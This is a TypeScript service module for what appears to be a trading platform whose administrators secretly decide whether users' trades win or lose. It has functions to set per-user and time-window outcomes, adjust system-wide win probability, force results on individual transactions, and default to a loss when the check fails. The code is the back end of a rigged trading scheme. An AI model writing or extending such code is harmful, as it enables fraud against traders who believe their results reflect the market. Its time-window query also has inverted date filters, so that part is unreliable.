import { supabase } from '@/lib/supabase';

export interface TradeControlResult {
  shouldWin: boolean;
  outcomeType: 'win' | 'loss' | 'default';
  reason: string;
}

class TradingControlService {
  // ==================== TRADE OUTCOME CHECKS ====================
  
  async checkTradeOutcome(userId: string, tradeType: string): Promise<TradeControlResult> {
    try {
      const { data, error } = await supabase.rpc('check_trade_outcome', {
        p_user_id: userId,
        p_trade_type: tradeType
      });

      if (error) throw error;

      const shouldWin = Boolean(data);
      
      return {
        shouldWin,
        outcomeType: shouldWin ? 'win' : 'loss',
        reason: this.getOutcomeReason(shouldWin, tradeType)
      };
    } catch (error) {
      console.error('Error checking trade outcome:', error);
      // Default to loss if system fails
      return {
        shouldWin: false,
        outcomeType: 'loss',
        reason: 'System error - defaulting to loss'
      };
    }
  }

  private getOutcomeReason(shouldWin: boolean, tradeType: string): string {
    if (shouldWin) {
      return `Admin-controlled win for ${tradeType} trading`;
    } else {
      return `Admin-controlled loss for ${tradeType} trading`;
    }
  }

  // ==================== ADMIN CONTROL MANAGEMENT ====================
  
  async setUserTradeOutcome(userId: string, settings: {
    enabled: boolean;
    outcomeType: 'win' | 'loss' | 'default';
    spotEnabled?: boolean;
    futuresEnabled?: boolean;
    optionsEnabled?: boolean;
    arbitrageEnabled?: boolean;
  }): Promise<void> {
    try {
      const { error } = await supabase
        .from('trade_outcomes')
        .upsert({
          user_id: userId,
          enabled: settings.enabled,
          outcome_type: settings.outcomeType,
          spot_enabled: settings.spotEnabled || false,
          futures_enabled: settings.futuresEnabled || false,
          options_enabled: settings.optionsEnabled || false,
          arbitrage_enabled: settings.arbitrageEnabled || false,
          updated_at: new Date().toISOString()
        });

      if (error) throw error;
    } catch (error) {
      console.error('Error setting user trade outcome:', error);
      throw error;
    }
  }

  async setTimeBasedControl(settings: {
    userId: string;
    outcomeType: 'win' | 'loss';
    startTime: Date;
    endTime: Date;
    spotEnabled?: boolean;
    futuresEnabled?: boolean;
    optionsEnabled?: boolean;
    arbitrageEnabled?: boolean;
    reason?: string;
  }): Promise<void> {
    try {
      const { error } = await supabase
        .from('trade_windows')
        .insert({
          user_id: settings.userId,
          outcome_type: settings.outcomeType,
          start_time: settings.startTime.toISOString(),
          end_time: settings.endTime.toISOString(),
          spot_enabled: settings.spotEnabled || false,
          futures_enabled: settings.futuresEnabled || false,
          options_enabled: settings.optionsEnabled || false,
          arbitrage_enabled: settings.arbitrageEnabled || false,
          reason: settings.reason,
          active: true,
          created_at: new Date().toISOString()
        });

      if (error) throw error;
    } catch (error) {
      console.error('Error setting time-based control:', error);
      throw error;
    }
  }

  // ==================== USER SETTINGS ====================
  
  async getUserTradeSettings(userId: string): Promise<any> {
    try {
      const { data, error } = await supabase
        .from('trade_outcomes')
        .select('*')
        .eq('user_id', userId)
        .single();

      if (error && error.code !== 'PGRST116') throw error;
      
      return data;
    } catch (error) {
      console.error('Error fetching user trade settings:', error);
      return null;
    }
  }

  async getActiveTimeWindows(userId: string): Promise<any[]> {
    try {
      const { data, error } = await supabase
        .from('trade_windows')
        .select('*')
        .eq('user_id', userId)
        .eq('active', true)
        .gte('start_time', new Date().toISOString())
        .lte('end_time', new Date().toISOString());

      if (error) throw error;
      
      return data || [];
    } catch (error) {
      console.error('Error fetching time windows:', error);
      return [];
    }
  }

  // ==================== SYSTEM SETTINGS ====================
  
  async getSystemTradingSettings(): Promise<any> {
    try {
      const { data, error } = await supabase
        .from('trading_settings')
        .select('*')
        .single();

      if (error) throw error;
      
      return data;
    } catch (error) {
      console.error('Error fetching system settings:', error);
      return null;
    }
  }

  async updateSystemSettings(settings: {
    defaultOutcome?: 'win' | 'loss' | 'random';
    winProbability?: number;
    spotDefault?: 'win' | 'loss' | 'random';
    futuresDefault?: 'win' | 'loss' | 'random';
    optionsDefault?: 'win' | 'loss' | 'random';
    arbitrageDefault?: 'win' | 'loss' | 'random';
  }): Promise<void> {
    try {
      const { error } = await supabase
        .from('trading_settings')
        .update({
          ...settings,
          updated_at: new Date().toISOString()
        })
        .eq('id', (await this.getSystemTradingSettings())?.id);

      if (error) throw error;
    } catch (error) {
      console.error('Error updating system settings:', error);
      throw error;
    }
  }

  // ==================== AUDIT LOG ====================
  
  async logAdminAction(adminId: string, action: string, userId?: string, details?: any): Promise<void> {
    try {
      const { error } = await supabase.rpc('log_trading_admin_action', {
        p_admin_id: adminId,
        p_action: action,
        p_user_id: userId || null,
        p_details: details || null
      });

      if (error) throw error;
    } catch (error) {
      console.error('Error logging admin action:', error);
    }
  }

  async getAuditLog(limit: number = 100): Promise<any[]> {
    try {
      const { data, error } = await supabase
        .from('trading_admin_audit')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(limit);

      if (error) throw error;
      
      return data || [];
    } catch (error) {
      console.error('Error fetching audit log:', error);
      return [];
    }
  }

  // ==================== UTILITY FUNCTIONS ====================
  
  async forceTradeResult(transactionId: string, outcome: 'win' | 'loss', adminId: string): Promise<void> {
    try {
      // Update the transaction with forced outcome
      const { error } = await supabase
        .from('transactions')
        .update({
          metadata: {
            outcome,
            forced: true,
            forced_by: adminId,
            forced_at: new Date().toISOString()
          },
          updated_at: new Date().toISOString()
        })
        .eq('id', transactionId);

      if (error) throw error;

      // Log the admin action
      await this.logAdminAction(adminId, `force_trade_${outcome}`, undefined, {
        transactionId,
        outcome
      });
    } catch (error) {
      console.error('Error forcing trade result:', error);
      throw error;
    }
  }

  async getUserTradeHistory(userId: string, limit: number = 50): Promise<any[]> {
    try {
      const { data, error } = await supabase
        .from('transactions')
        .select('*')
        .eq('userId', userId)
        .order('createdAt', { ascending: false })
        .limit(limit);

      if (error) throw error;
      
      return data || [];
    } catch (error) {
      console.error('Error fetching user trade history:', error);
      return [];
    }
  }
}

export const tradingControlService = new TradingControlService();
